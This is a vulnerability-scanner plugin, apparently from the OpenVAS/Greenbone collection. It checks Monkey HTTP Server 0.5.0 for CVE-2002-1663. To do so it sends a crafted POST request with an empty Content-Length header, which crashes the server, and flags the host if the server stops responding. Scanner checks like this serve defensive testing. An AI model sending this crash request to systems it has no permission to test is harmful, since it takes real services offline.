# SPDX-FileCopyrightText: 2003 Michel Arboi
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11924");
  script_version("2024-05-24T19:38:34+0000");
  script_cve_id("CVE-2002-1663");
  script_tag(name:"last_modification", value:"2024-05-24 19:38:34 +0000 (Fri, 24 May 2024)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("Monkey HTTP Server <= 0.5.0 DoS Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2003 Michel Arboi");
  script_family("Denial of Service");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 2001);
  script_mandatory_keys("Monkey/banner");

  script_xref(name:"URL", value:"https://web.archive.org/web/20210121155621/http://www.securityfocus.com/bid/6096/");

  script_tag(name:"summary", value:"Monkey HTTP Server is prone to a denial of service (DoS)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks if the system is
  still responding afterwards.");

  script_tag(name:"insight", value:"The product crashes when it receives an incorrect POST command
  with an empty 'Content-Length:' field.");

  script_tag(name:"impact", value:"An attacker may use this bug to disable your server, preventing
  it from publishing your information.");

  script_tag(name:"affected", value:"Monkey HTTP Server version 0.5.0 is known to be affected. Other
  versions or products might be affected as well.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

port = http_get_port(default:2001);
banner = http_get_remote_headers(port:port);

if(!banner || banner !~ "Server\s*:\s*Monkey")
  exit(0);

if(http_is_dead(port:port))
  exit(0);

if(!soc = http_open_socket(port))
  exit(0);

r = http_post(item:"/", port:port, data:"");
r2 = ereg_replace(string:r, pattern:"Content-Length\s*:( [0-9]+)", replace:"Content-Length:");
if(r2 == r) { # Did not match?
  r2 = string('POST / HTTP/1.0\r\n',
              'Host: ', get_host_ip(), '\r\n',
              'Content-Length:\r\n\r\n');
}

send(socket:soc, data:r2);
http_recv(socket:soc);
http_close_socket(soc);

if(http_is_dead(port:port)) {
  security_message(port:port, report:"The HTTP server is not responding anymore after receiving our crafted HTTP request.");
  set_kb_item(name:"www/buggy_post_crash", value:TRUE);
  exit(0);
}

exit(99);
